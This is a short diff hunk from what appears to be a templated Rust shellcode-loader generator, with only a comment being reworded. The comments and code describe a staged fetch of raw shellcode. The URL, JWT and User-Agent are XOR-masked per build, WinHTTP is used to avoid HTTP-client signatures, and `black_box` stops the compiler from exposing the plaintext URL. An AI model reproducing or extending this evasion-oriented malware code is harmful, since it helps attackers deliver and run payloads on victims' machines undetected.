@@ -33,7 +33,7 @@ fn {{ v.fn_run }}() {
         // Staged fetch: URL/JWT/User-Agent are XOR-masked per-build, decoded just before
         // the fetch. Network call uses WinHTTP (no Rust HTTP-client signatures in the
         // binary). Response body is the *raw* shellcode (transport encryption via HTTPS).
-        // `black_box` defeats rustc's constant-folding of the XOR loop — without it the
+        // black_box defeats rustc's constant-folding of the XOR loop - without it the
         // optimizer would pre-compute the plaintext URL into rodata.
         let mut {{ sg.sg_lv_url }}: [u8; {{ staged_url_len }}] = [
             {%- for b in staged_url_enc %}{{ b }},{% endfor %}
